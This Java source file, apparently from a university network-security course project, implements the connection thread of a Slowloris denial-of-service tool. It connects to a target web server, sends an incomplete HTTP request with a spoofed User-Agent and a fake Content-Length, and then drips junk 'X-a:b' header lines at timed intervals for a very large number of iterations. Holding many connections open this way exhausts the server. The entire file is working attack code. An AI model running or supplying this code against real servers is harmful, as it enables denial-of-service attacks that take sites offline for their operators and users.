package in.ac.iiitd.ns;

import in.ac.iiitd.ns.SlowLoris.UPDATE_TYPE;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

/**
 * Connection to a specified host and keeps the connection alive as long as possible by sending some junk headers to consume the Server resources 
 * @author Suresh Rangaswamy
 *
 */
public class Connection implements Runnable{

    /** Host Name of the server */
    private final String hostname;
    /** Port of the server */
    private final int port;
    /** time between successive headers sent In Milliseconds*/
    private final int interval;
    /** Socket to write to */
    private Socket socket;
    /** Writer used to write */
    private BufferedWriter writer;
    private final int UA;
    private final int CL; 

    private final SlowLoris slowloris;

    /** List of User-Agents to be used in the http calls */
    static final String[] USER_AGENTS = new String[]{
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) AppleWebKit/534.48.3 (KHTML, like Gecko) Version/5.1 Safari/534.48.3",
        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) Gecko/20100101 Firefox/5.0.1",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.122 Safari/534.30",
        "Opera/9.80 (Macintosh; Intel Mac OS X 10.7.0; U; Edition MacAppStore; en) Presto/2.9.168 Version/11.50",
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2)"
    };

    public 	Connection(String hostname, int port, int interval, SlowLoris slowLoris, int UA) {
        // TODO Auto-generated constructor stub
        this.hostname = hostname;
        this.port = port;
        this.interval = interval;
        this.slowloris = slowLoris;
        this.UA = UA%USER_AGENTS.length;
        this.CL = (15698415 * UA)%1000007;
    }

    @Override
    public void run() {
        // TODO Auto-generated method stub
        try {
            socket = new Socket(InetAddress.getByName(hostname), port);

            // Update the state to connected
            slowloris.update(UPDATE_TYPE.CONNECTED);

            writer = new BufferedWriter(new OutputStreamWriter(
                    socket.getOutputStream(), "UTF-8")); // A writer used to output to the socket
            writer.write("GET / HTTP/1.1\r\n");
            writer.write("Host: " + hostname + " \r\n");
            writer.write("User-agent:" + USER_AGENTS[UA] + "\r\n");
            writer.write("Content-Length: " + CL + "\r\n");
            writer.write("Connection:close\r\n");
            writer.write("X-a:\r\n");	// Custom header, contains junk
            writer.flush();				// Flushes the writer, to ensure that the header is written to the socket

            for (int i = 0; i < 100000000; i++) {
                writer.write("X-a:b\r\n");	// The continuation of the custom "header"
                writer.flush();				// Flushes the writer to ensure the continuation data is written to the socket
                try {
                    Thread.sleep(interval);	// Forces this thread to wait, to make the connection last
                } catch (InterruptedException e) {
                    System.err.println("Thread can't sleep");
                }
            }

            writer.close();
            socket.close();
            slowloris.update(UPDATE_TYPE.CLOSED);
            System.out.println("Thread finished");

        } catch (UnknownHostException e) {
            // TODO Auto-generated catch block
            if(SlowLoris.DEBUG)
                System.err.println("Hostname Could not be resolved, Please check the DNS");
            slowloris.update(UPDATE_TYPE.CLOSED);
        } catch (ConnectException e) {
            System.out.println("Connection error! Check that there is an HTTP server and the port is correct.");
            slowloris.update(UPDATE_TYPE.CLOSED);
            System.exit(0);
        } catch (SocketException e) {
            //e.printStackTrace();
            slowloris.update(UPDATE_TYPE.CLOSED);
            if(SlowLoris.DEBUG)
                if(SlowLoris.DEBUG)
                    System.out.println("Thread had a socket error; attempting to rebuild.");
            try {
                writer.close();
                socket.close();
                return;
            } catch (IOException e1) {
                if(SlowLoris.DEBUG)
                    e1.printStackTrace();
            }

        } catch (Exception e) {
            slowloris.update(UPDATE_TYPE.ERROR);
            if(SlowLoris.DEBUG)
                e.printStackTrace();
        }
    }

}
